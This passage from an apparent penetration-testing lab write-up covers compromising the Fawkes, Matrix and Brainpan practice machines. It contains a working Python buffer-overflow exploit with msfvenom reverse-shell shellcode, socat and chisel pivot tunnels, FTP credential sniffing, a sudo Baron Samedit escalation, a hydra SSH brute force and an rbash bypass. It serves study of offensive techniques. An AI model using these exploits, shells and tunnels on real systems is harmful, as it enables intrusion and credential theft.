Enter your spell: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC

[----------------------------------registers-----------------------------------]
EAX: 0xffffcb9c ('A' <repeats 112 times>, "BBBB", 'C' <repeats 84 times>...)
EBX: 0x41414141 ('AAAA')
ECX: 0xffffce30 --> 0xa ('\n')
EDX: 0xffffcc74 --> 0xa ('\n')
ESI: 0x80b3158 ("../csu/libc-start.c")
EDI: 0xffffd158 ("\nEnter your spell: ")
EBP: 0x41414141 ('AAAA')
ESP: 0xffffcc10 ('C' <repeats 100 times>, "\n")
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xffffcc10 ('C' <repeats 100 times>, "\n")
0004| 0xffffcc14 ('C' <repeats 96 times>, "\n")
0008| 0xffffcc18 ('C' <repeats 92 times>, "\n")
0012| 0xffffcc1c ('C' <repeats 88 times>, "\n")
0016| 0xffffcc20 ('C' <repeats 84 times>, "\n")
0020| 0xffffcc24 ('C' <repeats 80 times>, "\n")
0024| 0xffffcc28 ('C' <repeats 76 times>, "\n")
0028| 0xffffcc2c ('C' <repeats 72 times>, "\n")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
gdb-peda$ 
```

We can see that the value of **$eip** is ('BBBB'), now we have to look for an address that if I point to it I can do a **JMP ESP** because there is going to be our **shellcode** to do this we can take it to a python script.

First we have to create shellcode with msfvenom. The shellcode has to point to the Nagini machine because it does not see the attacking machine or aragog.

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.100.130 LPORT=5555 -b "\x00" -f py -v shellcode
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 12 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of py file: 550 bytes
shellcode =  b""
shellcode += b"\xbf\x7f\x63\x59\xb5\xdb\xce\xd9\x74\x24\xf4"
shellcode += b"\x5e\x33\xc9\xb1\x12\x83\xc6\x04\x31\x7e\x0e"
shellcode += b"\x03\x01\x6d\xbb\x40\xcc\xaa\xcc\x48\x7d\x0e"
shellcode += b"\x60\xe5\x83\x19\x67\x49\xe5\xd4\xe8\x39\xb0"
shellcode += b"\x56\xd7\xf0\xc2\xde\x51\xf2\xaa\x20\x09\x60"
shellcode += b"\xa8\xc9\x48\x69\xb9\xba\xc4\x88\x71\xda\x86"
shellcode += b"\x1b\x22\x90\x24\x15\x25\x1b\xaa\x77\xcd\xca"
shellcode += b"\x84\x04\x65\x7b\xf4\xc5\x17\x12\x83\xf9\x85"
shellcode += b"\xb7\x1a\x1c\x99\x33\xd0\x5f"
```

Python exploit:

```
#!/usr/bin/env python3

import signal, sys, socket


def def_handler(sig, frame):

    print("\n [!] Leaving the program... \n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)


# Global variables

offset = 112
before_eip = b"A" * offset

eip = b"\x55\x9d\x04\x08" # 8049d55 = > JMP ESP

shellcode =  b""
shellcode += b"\xbd\xb3\xe8\xee\xf8\xdd\xc7\xd9\x74\x24\xf4"
shellcode += b"\x5f\x2b\xc9\xb1\x12\x31\x6f\x12\x03\x6f\x12"
shellcode += b"\x83\x5c\x14\x0c\x0d\x93\x3e\x26\x0d\x80\x83"
shellcode += b"\x9a\xb8\x24\x8d\xfc\x8d\x4e\x40\x7e\x7e\xd7"
shellcode += b"\xea\x40\x4c\x67\x43\xc6\xb7\x0f\x94\x90\x2c"
shellcode += b"\x4d\x7c\xe3\xac\x44\xce\x6a\x4d\xd6\x56\x3d"
shellcode += b"\xdf\x45\x24\xbe\x56\x88\x87\x41\x3a\x22\x76"
shellcode += b"\x6d\xc8\xda\xee\x5e\x01\x78\x86\x29\xbe\x2e"
shellcode += b"\x0b\xa3\xa0\x7e\xa0\x7e\xa2"

after_eip = b"\x90"*32 + shellcode # ESP

ip = "192.168.100.128"
port = 9898

payload = before_eip + eip + after_eip


def exploit():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((ip, port))
    s.send(payload)
    s.close

if __name__ == '__main__':

    exploit()

```

Finally, we have to configure the tunnel so that we receive the revershell. Apart from the configuration mentioned above we have to create another one so that the reverse shell can travel from the Fawke machine to our attackers machine, for this it must pass through the **Nagini** **Aragog** machine and finally ours, for this I will show you the other ssh sessions that I have created in order to get it. 

```
root@Nagini:~# ./socat TCP-LISTEN:5555.fork TCP:10.10.0.128:3333

root@Aragog:~# ./socat TCP-LISTEN:3333.fork TCP:192.168.1.21:443

 nc -nlvp 443
listening on [any] 443 ...

```

Finally we can execute the payload:

```
proxychains python3 payload.py
ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-<>-127.0.0.1:8888-<>-127.0.0.1:1080-<--timeout
|D-chain|-<>-127.0.0.1:8888-<><>-192.168.100.128:9898-<><>-OK
 
 nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.1.21] from (UNKNOWN) [192.168.1.31] 50586
whoami
harry

```

## Got Root

After exploiting a Buffer OverFlow we are the user harry, and if we run a **hostname** we can see that we are in a container.

```
nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.1.21] from (UNKNOWN) [192.168.1.31] 50586
whoami
harry
hostname
2b1599256ca6

```
We list if the user harry has any permissions in the sudo group.

```
sudo -l
User harry may run the following commands on 2b1599256ca6:
    (ALL) NOPASSWD: ALL
sudo /bin/sh
whoami
root
```
Now we searched the directories for information and found the following:

```
cd /root/
ifconfig
eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:02  
          inet addr:172.17.0.2  Bcast:172.17.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:379 errors:0 dropped:0 overruns:0 frame:0
          TX packets:436 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:27456 (26.8 KiB)  TX bytes:47024 (45.9 KiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

cat note.txt
Hello Admin!!

We have found that someone is trying to login to our ftp server by mistake.You are requested to analyze the traffic and figure out the user.
```
At this point if someone tries to connect via ftp in the container we can remain listening to see their credentials.

```
which tcpdump
/usr/bin/tcpdump

tcpdump -i eth0 port ftp or ftp-data

tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
12:34:01.580694 IP 172.17.0.1.55132 > 2b1599256ca6.21: Flags [S], seq 2546197881, win 64240, options [mss 1460,sackOK,TS val 227491800 ecr 0,nop,wscale 7], length 0
12:34:01.580702 IP 2b1599256ca6.21 > 172.17.0.1.55132: Flags [S.], seq 2791639155, ack 2546197882, win 65160, options [mss 1460,sackOK,TS val 2239188086 ecr 227491800,nop,wscale 7], length 0
12:34:01.580714 IP 172.17.0.1.55132 > 2b1599256ca6.21: Flags [.], ack 1, win 502, options [nop,nop,TS val 227491800 ecr 2239188086], length 0
12:34:01.581191 IP 2b1599256ca6.21 > 172.17.0.1.55132: Flags [P.], seq 1:21, ack 1, win 510, options [nop,nop,TS val 2239188087 ecr 227491800], length 20: FTP: 220 (vsFTPd 3.0.3)
12:34:01.581222 IP 172.17.0.1.55132 > 2b1599256ca6.21: Flags [.], ack 21, win 502, options [nop,nop,TS val 227491801 ecr 2239188087], length 0
12:34:01.581266 IP 172.17.0.1.55132 > 2b1599256ca6.21: Flags [P.], seq 1:15, ack 21, win 502, options [nop,nop,TS val 227491801 ecr 2239188087], length 14: FTP: USER neville
12:34:01.581268 IP 2b1599256ca6.21 > 172.17.0.1.55132: Flags [.], ack 15, win 510, options [nop,nop,TS val 2239188087 ecr 227491801], length 0
12:34:01.581290 IP 2b1599256ca6.21 > 172.17.0.1.55132: Flags [P.], seq 21:55, ack 15, win 510, options [nop,nop,TS val 2239188087 ecr 227491801], length 34: FTP: 331 Please specify the password.
12:34:01.581330 IP 172.17.0.1.55132 > 2b1599256ca6.21: Flags [P.], seq 15:30, ack 55, win 502, options [nop,nop,TS val 227491801 ecr 2239188087], length 15: FTP: PASS bL!Bsg3k
12:34:01.623441 IP 2b1599256ca6.21 > 172.17.0.1.55132: Flags [.], ack 30, win 510, options [nop,nop,TS val 2239188129 ecr 227491801], length 0
12:34:04.413377 IP 2b1599256ca6.21 > 172.17.0.1.55132: Flags [P.], seq 55:77, ack 30, win 510, options [nop,nop,TS val 2239190919 ecr 227491801], length 22: FTP: 530 Login incorrect.
12:34:04.413680 IP 172.17.0.1.55132 > 2b1599256ca6.21: Flags [P.], seq 30:36, ack 77, win 502, options [nop,nop,TS val 227494633 ecr 2239190919], length 6: FTP: QUIT
12:34:04.413709 IP 2b1599256ca6.21 > 172.17.0.1.55132: Flags [.], ack 36, win 510, options [nop,nop,TS val 2239190919 ecr 227494633], length 0
12:34:04.413831 IP 2b1599256ca6.21 > 172.17.0.1.55132: Flags [P.], seq 77^C

```

Podemos ver el usuario **neville** y la contraseña **bL!Bsg3k** y recordemos que el puerto ssh en las maquinas fawkes esta abierto podemos intentar conectarnos via ssh con estas credenciales.

```
proxychains ssh neville@192.168.100.128
ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-<>-127.0.0.1:8888-<>-127.0.0.1:1080-<--timeout
|D-chain|-<>-127.0.0.1:8888-<><>-192.168.100.128:22-<><>-OK
neville@192.168.100.128's password: 
Linux Fawkes 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 27 19:24:01 2024 from 192.168.100.130
neville@Fawkes:~$ export TERM=xterm
neville@Fawkes:~$ whoamio
-bash: whoamio: command not found
neville@Fawkes:~$ whoami
neville
```

To escalate our privilege after much enumeration we can see that the sudo version is **1.8.27** which is vulnerable, for this we have been able to find a script that automates everything.

```
neville@Fawkes:/dev/shm$ python3 exploit.py 
# whoami
root
# bash
root@Fawkes:/dev/shm# 
```

A summary of what the script takes advantage of:

It exploits a vulnerability known as CVE-2021-3156, also known as “Baron Samedit”. This vulnerability affects several versions of sudo, including version 1.8.27, and allows an unprivileged local attacker to obtain root permissions without authentication. Vulnerability CVE-2021-3156 is related to a stack-based buffer overflow due to a bug in sudo's argument parsing function. Specifically, by handling escape characters in command arguments, sudo can allow writing outside expected memory limits, which can be exploited to overwrite internal variablesand execute arbitrary code with superuser permissions


# Matrix 

Now it is the turn of the Matrix machine, first as in the previous machines is to create a bash script to scan the network and find other machines on the same interface.

```
root@Fawkes:~# ls
chisel	horcrux3.txt  hostDiscovery.sh	socat
root@Fawkes:~# hostname -I
192.168.100.128 172.17.0.1 
root@Fawkes:~# nano hostDiscovery.sh 
root@Fawkes:~# bash hostDiscovery.sh 

Scanning in the network...

[+] Host: 192.168.100.1 - PORT 445 - OPEN
[+] Host: 192.168.100.128 - PORT 21 - OPEN
[+] Host: 192.168.100.128 - PORT 22 - OPEN
[+] Host: 192.168.100.128 - PORT 80 - OPEN
[+] Host: 192.168.100.130 - PORT 22 - OPEN
[+] Host: 192.168.100.130 - PORT 80 - OPEN
[+] Host: 192.168.100.133 - PORT 80 - OPEN
[+] Host: 192.168.100.133 - PORT 22 - OPEN

 All Already :)

root@Fawkes:~# 
```
We have to scan in the same IP range because **172.17.0.1** is the one of dockers, the IP of Matrix machine is **192.168.100.133**. Now we need to create the tunnel to see the Matrix machine from our attacking machines.

Apart from the configuration we already had in order to connect to the Fawkes machine we have to create a separate terminal and set the following instructions:

```
Aragog
root@Aragog:~# ./socat TCP-LISTEN:2323,fork TCP:192.168.1.21:1234

Nagini
root@Nagini:~# ./socat TCP-LISTEN:3434,fork TCP:10.10.0.128:2323

Fawkes
root@Fawkes:~# ./chisel client 192.168.100.130:3434 R:9999:socks

```

With this configuration we have created a new tunnel to see the Matrix machine. Remember that when chisel clinet connects to the chisel server, we have to add in our attacker machine the port that is being used for **Remote Port Forwading** in our **/etc/proxycahins.conf**.

```
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4    127.0.0.1 9050

# socks5 127.0.0.1 6757
socks5 127.0.0.1 9999
socks5 127.0.0.1 8888
socks5 127.0.0.1 1080
```

And finally we need to create a new proxy for our browser with **FoxyProxy**. As we taught previously

## ScanReport


```
seq 1 65536 | xargs -P 500 -I {} proxychains nmap -sT -Pn -p{} -n -v 192.168.100.133 2>&1 | grep "tcp open"
22/tcp open  ssh
80/tcp open  http
31337/tcp open  Elite

```

We found in the nmap report port 31337 open, first we take a look at the website and try to FUZZ the website, but we found nothing.


```
 export ALL_PROXY=socks5://127.0.0.1:8888
wfuzz --hc 404 -c -z file,/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt http://192.168.100.133/FUZZ

 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.100.133/FUZZ
Total requests: 1273833

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================
```


![](/assets/images/2024-08-17-eCPPTv2-simulation/screenMatrix.png)


At this point we try to look at the content on port **31337** to see if it changes at all.

![](/assets/images/2024-08-17-eCPPTv2-simulation/port-31337.png)

And yes it has changed we can see anohter content, let's take a look at the source code:

```
<!-- service -->
								<div class="service">
									<!--p class="service__text">ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg=</p-->
								</div><!-- End / service -->
```

We find a string encoded in base64, let's decode this string:

```
echo -n "ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhl
ci5tYXRyaXg=" | base64 -d; echo
echo "Then you'll see, that it is not the spoon that bends, it is only yourself. " > Cypher.matrix
```

At first I thought it was a subdomain, but before I tried to put it in the url to see if it was a directory and I was right. When we enter the direcory a file is downloaded:

```
+++++ ++++[ ->+++ +++++ +<]>+ +++++ ++.<+ +++[- >++++ <]>++ ++++. +++++
+.<++ +++++ ++[-> ----- ----< ]>--- -.<++ +++++ +[->+ +++++ ++<]> +++.-
-.<++ +[->+ ++<]> ++++. <++++ ++++[ ->--- ----- <]>-- ----- ----- --.<+
+++++ ++[-> +++++ +++<] >++++ +.+++ +++++ +.+++ +++.< +++[- >---< ]>---
---.< +++[- >+++< ]>+++ +.<++ +++++ ++[-> ----- ----< ]>-.< +++++ +++[-
>++++ ++++< ]>+++ +++++ +.+++ ++.++ ++++. ----- .<+++ +++++ [->-- -----
-<]>- ----- ----- ----. <++++ ++++[ ->+++ +++++ <]>++ +++++ +++++ +.<++
+[->- --<]> ---.< ++++[ ->+++ +<]>+ ++.-- .---- ----- .<+++ [->++ +<]>+
+++++ .<+++ +++++ +[->- ----- ---<] >---- ---.< +++++ +++[- >++++ ++++<
]>+.< ++++[ ->+++ +<]>+ +.<++ +++++ ++[-> ----- ----< ]>--. <++++ ++++[
->+++ +++++ <]>++ +++++ .<+++ [->++ +<]>+ ++++. <++++ [->-- --<]> .<+++
[->++ +<]>+ ++++. +.<++ +++++ +[->- ----- --<]> ----- ---.< +++[- >---<
]>--- .<+++ +++++ +[->+ +++++ +++<] >++++ ++.<+ ++[-> ---<] >---- -.<++
+[->+ ++<]> ++.<+ ++[-> ---<] >---. <++++ ++++[ ->--- ----- <]>-- -----
-.<++ +++++ +[->+ +++++ ++<]> +++++ +++++ +++++ +.<++ +[->- --<]> -----
-.<++ ++[-> ++++< ]>++. .++++ .---- ----. +++.< +++[- >---< ]>--- --.<+
+++++ ++[-> ----- ---<] >---- .<+++ +++++ [->++ +++++ +<]>+ +++++ +++++
.<+++ ++++[ ->--- ----< ]>--- ----- -.<++ +++++ [->++ +++++ <]>++ +++++
+++.. <++++ +++[- >---- ---<] >---- ----- --.<+ +++++ ++[-> +++++ +++<]
>++.< +++++ [->-- ---<] >-..< +++++ +++[- >---- ----< ]>--- ----- ---.-
--.<+ +++++ ++[-> +++++ +++<] >++++ .<+++ ++[-> +++++ <]>++ +++++ +.+++
++.<+ ++[-> ---<] >---- --.<+ +++++ [->-- ----< ]>--- ----. <++++ +[->-
----< ]>-.< +++++ [->++ +++<] >++++ ++++. <++++ +[->+ ++++< ]>+++ +++++
+.<++ ++[-> ++++< ]>+.+ .<+++ +[->- ---<] >---- .<+++ [->++ +<]>+ +..<+
++[-> +++<] >++++ .<+++ +++++ [->-- ----- -<]>- ----- ----- --.<+ ++[->
---<] >---. <++++ ++[-> +++++ +<]>+ ++++. <++++ ++[-> ----- -<]>- ----.
<++++ ++++[ ->+++ +++++ <]>++ ++++. +++++ ++++. +++.< +++[- >---< ]>--.
--.<+ ++[-> +++<] >++++ ++.<+ +++++ +++[- >---- ----- <]>-- -.<++ +++++
+[->+ +++++ ++<]> +++++ +++++ ++.<+ ++[-> ---<] >--.< ++++[ ->+++ +<]>+
+.+.< +++++ ++++[ ->--- ----- -<]>- --.<+ +++++ +++[- >++++ +++++ <]>++
+.+++ .---- ----. <++++ ++++[ ->--- ----- <]>-- ----- ----- ---.< +++++
+++[- >++++ ++++< ]>+++ .++++ +.--- ----. <++++ [->++ ++<]> +.<++ ++[->
----< ]>-.+ +.<++ ++[-> ++++< ]>+.< +++[- >---< ]>--- ---.< +++[- >+++<
]>+++ +.+.< +++++ ++++[ ->--- ----- -<]>- -.<++ +++++ ++[-> +++++ ++++<
]>++. ----. <++++ ++++[ ->--- ----- <]>-- ----- ----- ---.< +++++ +[->+
+++++ <]>++ +++.< +++++ +[->- ----- <]>-- ---.< +++++ +++[- >++++ ++++<
]>+++ +++++ .---- ---.< ++++[ ->+++ +<]>+ ++++. <++++ [->-- --<]> -.<++
+++++ +[->- ----- --<]> ----- .<+++ +++++ +[->+ +++++ +++<] >+.<+ ++[->
---<] >---- .<+++ [->++ +<]>+ +.--- -.<++ +[->- --<]> --.++ .++.- .<+++
+++++ [->-- ----- -<]>- ---.< +++++ ++++[ ->+++ +++++ +<]>+ +++++ .<+++
[->-- -<]>- ----. <+++[ ->+++ <]>++ .<+++ [->-- -<]>- --.<+ +++++ ++[->
----- ---<] >---- ----. <++++ +++[- >++++ +++<] >++++ +++.. <++++ +++[-
>---- ---<] >---- ---.< +++++ ++++[ ->+++ +++++ +<]>+ ++.-- .++++ +++.<
+++++ ++++[ ->--- ----- -<]>- ----- --.<+ +++++ +++[- >++++ +++++ <]>++
+++++ +.<++ +[->- --<]> -.+++ +++.- --.<+ +++++ +++[- >---- ----- <]>-.
<++++ ++++[ ->+++ +++++ <]>++ +++++ +++++ .++++ +++++ .<+++ +[->- ---<]
>--.+ +++++ ++.<+ +++++ ++[-> ----- ---<] >---- ----- --.<+ +++++ ++[->
+++++ +++<] >+.<+ ++[-> +++<] >++++ .<+++ [->-- -<]>- .<+++ +++++ [->--
----- -<]>- ---.< +++++ +++[- >++++ ++++< ]>+++ +++.+ ++.++ +++.< +++[-
>---< ]>-.< +++++ +++[- >---- ----< ]>--- -.<++ +++++ +[->+ +++++ ++<]>
+++.< +++[- >+++< ]>+++ .+++. .<+++ [->-- -<]>- ---.- -.<++ ++[-> ++++<
]>+.< +++++ ++++[ ->--- ----- -<]>- --.<+ +++++ +++[- >++++ +++++ <]>++
.+.-- .---- ----- .++++ +.--- ----. <++++ ++++[ ->--- ----- <]>-- -----
.<+++ +++++ [->++ +++++ +<]>+ +++++ +++++ ++++. ----- ----. <++++ ++++[
->--- ----- <]>-- ----. <++++ ++++[ ->+++ +++++ <]>++ +++++ +++++ ++++.
<+++[ ->--- <]>-- ----. <++++ [->++ ++<]> ++..+ +++.- ----- --.++ +.<++
+[->- --<]> ----- .<+++ ++++[ ->--- ----< ]>--- --.<+ ++++[ ->--- --<]>
----- ---.- --.<

```


This is a programming language called **Brainfuck** we can try to decode this intruction using ** Brainfuck decoder online **.

![](/assets/images/2024-08-17-eCPPTv2-simulation/Brainfuck-decoder.png)

When we decode it we can get to read this:

```
You can enter into matrix as guest, with password k1ll0rXX

Note: Actually, I forget last two characters so I have replaced with XX try your luck and find correct string of password.

```

If we remember that when we performed the scan on the Matrix machine port 22 was open, then we can try to connect via ssh with the user **guest** and the password we can try to crack it with **hydra**, to do this we can do the following:

Create a dictionari:

```
crunch 8 8 -t k1ll0r@% >> passwd.txt

Crunch will now generate the following amount of data: 2340 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 260 
❯ crunch 8 8 -t k1ll0r%@ >> passwd.txt

Crunch will now generate the following amount of data: 2340 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 260 
```

This command will generate a passwd.txt file containing all possible password combinations of length 8 following the pattern k1ll0r@%, where % will be replaced by all allowed special characters. So we run the command again but changing the sponsor from **%@** so that we have more possibilities in the dictionary. Now we can execute **hydra**

```
 proxychains hydra -l guest -P passwd.txt ssh://192.168.100.133 -t 20 2> /dev/null
ProxyChains-3.1 (http://proxychains.sf.net)
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-31 15:55:26
```

The valid passwd:

```
 "k1ll0r7n"
```

Once we have the credentials we can try to connect to the Matrix machine.

```
roxychains ssh guest@192.168.100.133
ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-<>-127.0.0.1:6757-<--timeout
|D-chain|-<>-127.0.0.1:9999-<>-127.0.0.1:8888-<--timeout
|D-chain|-<>-127.0.0.1:9999-<>-127.0.0.1:1080-<--timeout
|D-chain|-<>-127.0.0.1:9999-<><>-192.168.100.133:22-<><>-OK

guest@porteus:~$ ls
-rbash: /bin/ls: restricted: cannot specify `/' in command names
guest@porteus:~$ ls
-rbash: /bin/ls: restricted: cannot specify `/' in command names
guest@porteus:~$ ls
-rbash: /bin/ls: restricted: cannot specify `/' in command names
guest@porteus:~$ 

```

When we are inside the machine we can see that it is using **rbash**. 

rbash is a restricted version of the Unix Bash shell (Bourne Again SHell). In rbash (or “Restricted Bash”), some functions and features of the standard shell are disabled to limit usercapabilities, thus improving security in certain environments where it is necessary to restrict user actions.

But there is a bypass to get around this, we need to put **bash** at the end of the command.

```
 proxychains ssh guest@192.168.100.133 bash
ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-<>-127.0.0.1:6757-<--timeout
|D-chain|-<>-127.0.0.1:9999-<>-127.0.0.1:8888-<--timeout
|D-chain|-<>-127.0.0.1:9999-<>-127.0.0.1:1080-<--timeout
|D-chain|-<>-127.0.0.1:9999-<><>-192.168.100.133:22-<><>-OK
whoami
guest
echo $SHELL
/bin/rbash
ls
Desktop
Documents
Downloads
Music
Pictures
Public
Videos
prog

```

Now we have to do the stty treatment, as we taught previously.

## Got Root

On this machine this step has been very simple, we can execute the following command:

```
guest@porteus:~$ sudo -l
User guest may run the following commands on porteus:
    (ALL) ALL
    (root) NOPASSWD: /usr/lib64/xfce4/session/xfsm-shutdown-helper
    (trinity) NOPASSWD: /bin/cp
guest@porteus:~$ 
```

We can see that we have permissions to be able to run anything, using the password for the user **guest**:

```
guest@porteus:~$ sudo bash
Password: 
root@porteus:/home/guest# whoami
root
root@porteus:/home/guest# 
```

```
root@porteus:~# cd /root/

root@porteus:~# ls
Desktop/    Downloads/  Pictures/  Videos/  flag.txt          ip.sh
Documents/  Music/      Public/    

root@porteus:~# cat flag.txt 
   _,-.                                                             
,-'  _|                  EVER REWIND OVER AND OVER AGAIN THROUGH THE
|_,-O__`-._              INITIAL AGENT SMITH/NEO INTERROGATION SCENE
|`-._\`.__ `_.           IN THE MATRIX AND BEAT OFF                 
|`-._`-.\,-'_|  _,-'.                                               
     `-.|.-' | |`.-'|_     WHAT                                     
        |      |_|,-'_`.                                            
              |-._,-'  |     NO, ME NEITHER                         
         jrei | |    _,'                                            
              '-|_,-'          IT'S JUST A HYPOTHETICAL QUESTION    

root@porteus:~# 

```


# BrainPain

Finally we are on the last machine, before we start hacking the machine we need to export our ssh public key on the Matrix machines to have persistence and export the socat and chisel tools for the tunnels.

With the other tunnels we need to create another tunnel to see the Brainpan machine, as follow:

```
root@Aragog:~# ./socat TCP-LISTEN:6667,fork TCP:192.168.1.21:1234

root@Nagini:~# ./socat TCP-LISTEN:5455,fork TCP:10.10.0.128:6667

root@Fawkes:~# ./socat TCP-LISTEN:4444,fork TCP:192.168.100.130:5455

root@porteus:~# ./chisel client 192.168.100.128:4444 R:6767:socks
2024/09/04 20:26:39 client: Connecting to ws://192.168.100.128:4444
2024/09/04 20:26:39 client: Connected (Latency 1.636264ms)
```

Remember to add **127.0.0.1 6767** in **/etc/proxychains.conf**. Once this is done we have visibility with the brainpan machine.

## ScanReport

We scanned and found this

```
seq 1 65536 | xargs -P 500 -I {} proxychains nmap -sT -Pn -p{} -n -v 172.18.0.132 2>&1 | grep "tcp open"
9999/tcp open  abyss
10000/tcp open  snet-sensor-mgmt
```

![](/assets/images/2024-08-17-eCPPTv2-simulation/website-brainpan.png)


```
proxychains nc 172.18.0.132 9999
ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-<>-127.0.0.1:6767-<>-127.0.0.1:9999-<--timeout
|D-chain|-<>-127.0.0.1:6767-<>-127.0.0.1:8888-<--timeout
|D-chain|-<>-127.0.0.1:6767-<>-127.0.0.1:1080-<--timeout
|D-chain|-<>-127.0.0.1:6767-<><>-172.18.0.132:9999-<><>-OK
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> 

```

On the web we found nothing but on port 9999 there is an internal program running, the following set we think is website fuzz to find more hidden directories. But if you try to fuzz you will know that it is impossible because of **timeout**, so we will use BurpSuite.

To do so, we must follow these steps:

We need to make Burpsuite use socks proxy type:

![](/assets/images/2024-08-17-eCPPTv2-simulation/burpsuite-setting.png)

Now we have to reload the web page we are going to fuzz while we have the burpsuite intercepting the traffic, it is important to have the proxy in the browser for it to work:

![](/assets/images/2024-08-17-eCPPTv2-simulation/website-intercept.png)

We have now intercepted the traffic with Burpsuite:

![](/assets/images/2024-08-17-eCPPTv2-simulation/trafic-intercepted.png)

Now we have to send it to intruder to prepare our payload, for this we have to do **Ctrl+I**:

![](/assets/images/2024-08-17-eCPPTv2-simulation/intruder.png)

When the request is intercepted without adding anything, we can add **test** after the slash, and select it and hit **add**:

![](/assets/images/2024-08-17-eCPPTv2-simulation/add.png)

Now we have to go inside payloads and select **Load** to load the dictionary that we are going to use to perform the attack:

![](/assets/images/2024-08-17-eCPPTv2-simulation/load.png)

Finally we can start the attack:

![](/assets/images/2024-08-17-eCPPTv2-simulation/attack.png)

We can distinguish the valid directories according to the status code, finally we find the **bin** directory:

![](/assets/images/2024-08-17-eCPPTv2-simulation/bin.png)

When we enter the **bin** directory, it offers us to download an .exe, probably the program that is running on the Brainpan machine on port 9999:

![](/assets/images/2024-08-17-eCPPTv2-simulation/download.png)

As it is an .exe we are going to use **Immunty Debuger** on a windows 7 x86 machine, to see if this program is vulnerable to a possible Buffer OverFlow.


## Buffer Over Flow

When we have installed the **Immunity Debugger** we have to run it in administrator mode and also run the Brainpan.exe and do the following:

![](/assets/images/2024-08-17-eCPPTv2-simulation/attach.png)

This is used to synchronize the Immunity Debugger with the program in order to debug it.

Now we have to check if for some reason the developer of this program has not sanitized the user input properly. So we have to connect from our attacker machine to the windows 7 machine we are using to debug the program. It is important that when we synchronize the program with the Immunity debugger on the windows 7 machine to hit start because it is already paused.
![](/assets/images/2024-08-17-eCPPTv2-simulation/paused.png)


```
Sending set of **A** to see program feedback:

nc 192.168.1.16 9999
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
